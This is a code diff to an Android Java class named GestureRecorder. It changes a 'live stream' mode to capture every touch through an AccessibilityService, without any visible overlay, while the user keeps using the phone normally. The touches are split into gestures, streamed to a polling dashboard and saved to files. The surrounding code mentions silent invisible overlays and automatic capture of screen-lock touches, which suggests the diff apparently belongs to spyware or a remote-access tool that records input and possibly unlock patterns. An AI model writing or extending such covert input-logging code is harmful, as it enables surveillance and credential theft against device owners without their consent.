@@ -71,6 +71,7 @@ public class GestureRecorder {
         float  nx;        // normalized 0..1
         float  ny;        // normalized 0..1
         long   t;         // ms since recording start
+        int    gestureId; // increments on each new touch-down — separates individual gestures
     }
 
     // -- Constructor ----------------------------------------------------------
@@ -603,6 +604,11 @@ public class GestureRecorder {
     private final List<GesturePoint> servicePts     = new ArrayList<>();
     private volatile long            servicePtsStart = 0;
 
+    // Points accumulated for the service-touch live stream (no overlay)
+    private final List<GesturePoint> liveServicePts        = new ArrayList<>();
+    private volatile long            liveServicePtsStart   = 0;
+    private volatile int             liveCurrentGestureId  = 0; // increments on each ACTION_DOWN
+
     // -- Screen-lock auto-capture state (service-touch, no overlay) -----------
     private volatile boolean         lockCaptureEnabled = false;
     private volatile boolean         lockCaptureActive  = false;
@@ -859,9 +865,16 @@ public class GestureRecorder {
     private String                 liveStreamFilename = null;
 
     /**
-     * Start a live stream session — creates a silent invisible overlay that
-     * records all touch interaction. Dashboard polls gesture_live_points for
-     * real-time point data. Call gesture_live_stop to save.
+     * Start a live stream session — uses AccessibilityService touch events
+     * (no blocking overlay) so the user can use the screen normally while
+     * every touch is captured and streamed to the dashboard in real time.
+     *
+     * Each finger-down → finger-up is recorded as a separate gesture segment
+     * (identified by gestureId) so individual taps, swipes, and draws are
+     * kept distinct on the dashboard canvas.
+     *
+     * Dashboard polls gesture_live_points for real-time point data.
+     * Call gesture_live_stop to save all collected gestures.
      */
     public JSONObject startLiveStream() {
         JSONObject r = new JSONObject();
@@ -871,106 +884,125 @@ public class GestureRecorder {
                 r.put("error", "Live stream already active");
                 return r;
             }
-            if (isRecording) {
-                r.put("success", false);
-                r.put("error", "Another recording is already active");
-                return r;
+            // Clear any previous overlay if it lingered
+            if (liveOverlay != null) {
+                try { mainHandler.post(() -> liveOverlay.hide()); } catch (Exception ignored) {}
+                liveOverlay = null;
             }
+            // Reset service-touch buffer
+            synchronized (liveServicePts) { liveServicePts.clear(); }
+            liveCurrentGestureId = 0;
+            liveServicePtsStart  = System.currentTimeMillis();
+            liveStreamFilename   = null;
+            // Activate service-touch capture — handleServiceTouchEvent() takes over
             liveStreamActive = true;
-            isRecording      = true;
-            liveStreamFilename = null;
-            String label = "live_" + System.currentTimeMillis();
-            CountDownLatch latch = new CountDownLatch(1);
-            mainHandler.post(() -> {
-                liveOverlay = new RecordingOverlay(
-                        context, "live", label, screenW, screenH, wm,
-                        () -> { isRecording = false; liveStreamActive = false; });
-                liveOverlay.setSilent(true);
-                // Enable live replay mode: each gesture the user performs is silently
-                // replayed on the real app below the overlay, then the overlay resumes capture.
-                if (accessSvc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    liveOverlay.setLiveReplayMode(true);
-                    liveOverlay.setLiveReplaySvc(accessSvc);
-                }
-                try {
-                    liveOverlay.show();
-                } catch (Exception e) {
-                    Log.e(TAG, "startLiveStream overlay.show: " + e.getMessage());
-                    isRecording      = false;
-                    liveStreamActive = false;
-                    liveOverlay      = null;
-                }
-                latch.countDown();
-            });
-            latch.await(2, TimeUnit.SECONDS);
-            if (liveOverlay == null) {
-                r.put("success", false);
-                r.put("error", "Failed to create live stream overlay");
-                return r;
-            }
+            // isRecording stays false — no overlay, nothing blocks the user
             r.put("success", true);
-            r.put("message", "Live stream started");
+            r.put("message", "Live stream started (service-touch mode — screen fully usable)");
         } catch (Exception e) {
             liveStreamActive = false;
-            isRecording      = false;
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
         return r;
     }
 
-    /** Stop live stream and save the recorded interaction. */
+    /** Stop live stream and save the recorded interaction from the service-touch buffer. */
     public JSONObject stopLiveStream() {
         JSONObject r = new JSONObject();
         try {
             liveStreamActive = false;
-            isRecording      = false;
-            if (liveOverlay == null) {
-                r.put("success", true);
+            // Clean up any lingering overlay
+            if (liveOverlay != null) {
+                final RecordingOverlay cur = liveOverlay;
+                liveOverlay = null;
+                mainHandler.post(() -> { try { cur.hide(); } catch (Exception ignored) {} });
+            }
+
+            // Save from service-touch buffer
+            List<GesturePoint> snapshot;
+            synchronized (liveServicePts) {
+                snapshot = new ArrayList<>(liveServicePts);
+                liveServicePts.clear();
+            }
+
+            r.put("success", true);
+            if (snapshot.isEmpty()) {
                 r.put("saved", false);
-                r.put("message", "No active live stream");
+                r.put("message", "Live stream stopped but no touches were recorded");
                 return r;
             }
-            final RecordingOverlay cur = liveOverlay;
-            liveOverlay = null;
-            final JSONObject[] saved = {null};
-            CountDownLatch latch = new CountDownLatch(1);
-            mainHandler.post(() -> {
-                saved[0] = cur.stopAndSave(gestureDir());
-                latch.countDown();
-            });
-            latch.await(3, TimeUnit.SECONDS);
-            r.put("success", true);
-            if (saved[0] != null) {
-                r.put("saved", true);
-                String fn = saved[0].optString("filename", null);
-                liveStreamFilename = fn;
-                r.put("filename", fn);
-                r.put("pointCount", saved[0].optInt("pointCount", 0));
-            } else {
-                r.put("saved", false);
-                r.put("message", "Live stream stopped but no points were recorded");
+
+            // Build JSON and save to file (includes gestureId so dashboard can segment strokes)
+            JSONArray arr = new JSONArray();
+            long firstT = -1;
+            for (GesturePoint gp : snapshot) {
+                if (firstT < 0) firstT = gp.t;
+                JSONObject p = new JSONObject();
+                p.put("id",     gp.pointerId);
+                p.put("action", gp.action);
+                p.put("nx",     gp.nx);
+                p.put("ny",     gp.ny);
+                p.put("t",      gp.t);
+                p.put("gid",    gp.gestureId);
+                arr.put(p);
             }
+            long durationMs = snapshot.isEmpty() ? 0
+                    : (snapshot.get(snapshot.size() - 1).t - snapshot.get(0).t);
+
+            String ts    = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+            String label = "live_" + ts;
+            String fn    = "live_stream_" + ts + ".json";
+
+            JSONObject data = new JSONObject();
+            data.put("label",      label);
+            data.put("packageId",  "live");
+            data.put("screenW",    screenW);
+            data.put("screenH",    screenH);
+            data.put("durationMs", durationMs);
+            data.put("recordedAt", System.currentTimeMillis());
+            data.put("points",     arr);
+
+            File out = new File(gestureDir(), fn);
+            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }
+
+            liveStreamFilename = fn;
+            r.put("saved",      true);
+            r.put("filename",   fn);
+            r.put("pointCount", snapshot.size());
+            r.put("gestures",   liveCurrentGestureId);
+            Log.i(TAG, "Live stream saved: " + fn + " (" + snapshot.size() + " pts, " + liveCurrentGestureId + " gestures)");
         } catch (Exception e) {
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
         return r;
     }
 
-    /** Return current live stream points snapshot for dashboard polling. */
+    /** Return current live stream points snapshot for dashboard polling (service-touch mode). */
     public JSONObject getLiveStreamPoints() {
         JSONObject r = new JSONObject();
         try {
             r.put("recording", liveStreamActive);
-            if (!liveStreamActive || liveOverlay == null) {
-                r.put("success", true);
-                r.put("points", new JSONArray());
-                r.put("pointCount", 0);
-                return r;
+            JSONArray arr = new JSONArray();
+            if (liveStreamActive) {
+                synchronized (liveServicePts) {
+                    // Return up to the last 1000 points to keep the payload small
+                    int start = Math.max(0, liveServicePts.size() - 1000);
+                    for (int i = start; i < liveServicePts.size(); i++) {
+                        GesturePoint gp = liveServicePts.get(i);
+                        JSONObject p = new JSONObject();
+                        p.put("id",  gp.pointerId);
+                        p.put("nx",  gp.nx);
+                        p.put("ny",  gp.ny);
+                        p.put("t",   gp.t);
+                        p.put("gid", gp.gestureId);
+                        arr.put(p);
+                    }
+                }
             }
-            JSONArray snapshot = liveOverlay.getPointsSnapshot(1000);
             r.put("success",    true);
-            r.put("points",     snapshot);
-            r.put("pointCount", snapshot.length());
+            r.put("points",     arr);
+            r.put("pointCount", arr.length());
+            r.put("gestures",   liveCurrentGestureId);
             r.put("screenW",    screenW);
             r.put("screenH",    screenH);
         } catch (Exception e) {
@@ -980,8 +1012,8 @@ public class GestureRecorder {
     }
 
     /**
-     * Replay a live stream file — returns all points so the dashboard can
-     * animate them directly on its canvas (no device gesture dispatch).
+     * Replay a live stream file — returns all points (with gid) so the
+     * dashboard can animate them on its canvas with each gesture drawn separately.
      */
     public JSONObject replayLiveStream(String filename) {
         JSONObject r = new JSONObject();
@@ -994,10 +1026,12 @@ public class GestureRecorder {
             if (data == null) {
                 r.put("success", false); r.put("error", "Parse error"); return r;
             }
+            // Return points as-is (they already contain gid from stopLiveStream)
+            JSONArray pts = data.optJSONArray("points");
+            if (pts == null) pts = new JSONArray();
             r.put("success",  true);
             r.put("filename", filename);
-            r.put("points",   data.optJSONArray("points") != null
-                              ? data.getJSONArray("points") : new JSONArray());
+            r.put("points",   pts);
             r.put("screenW",  data.optInt("screenW", screenW));
             r.put("screenH",  data.optInt("screenH", screenH));
         } catch (Exception e) {
@@ -1273,7 +1307,7 @@ public class GestureRecorder {
      * Always returns false so the system passes the touch through to the foreground app.
      */
     public void handleServiceTouchEvent(MotionEvent event) {
-        if (!autoCapturing && !lockCaptureActive) return;
+        if (!autoCapturing && !lockCaptureActive && !liveStreamActive) return;
         // Reset idle watchdog on every touch while auto-capturing
         if (autoCapturing) lastTouchMs = System.currentTimeMillis();
 
@@ -1304,6 +1338,30 @@ public class GestureRecorder {
 
             if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
                 onLockGestureLifted(nowMs);
+            }
+            return;
+        }
+
+        // ── Live stream mode: capture each touch as its own gesture segment ──
+        // Each ACTION_DOWN starts a new gestureId so the dashboard can draw
+        // individual touches/swipes/draws separately instead of merged together.
+        if (liveStreamActive) {
+            if (action == MotionEvent.ACTION_DOWN) {
+                liveCurrentGestureId++;
+                liveServicePtsStart = nowMs;
+            }
+            long relT = nowMs - liveServicePtsStart;
+            synchronized (liveServicePts) {
+                for (int i = 0; i < ptrCount; i++) {
+                    GesturePoint gp = new GesturePoint();
+                    gp.pointerId = event.getPointerId(i);
+                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
+                    gp.nx        = event.getX(i) / screenW;
+                    gp.ny        = event.getY(i) / screenH;
+                    gp.t         = relT;
+                    gp.gestureId = liveCurrentGestureId;
+                    liveServicePts.add(gp);
+                }
             }
             return;
         }
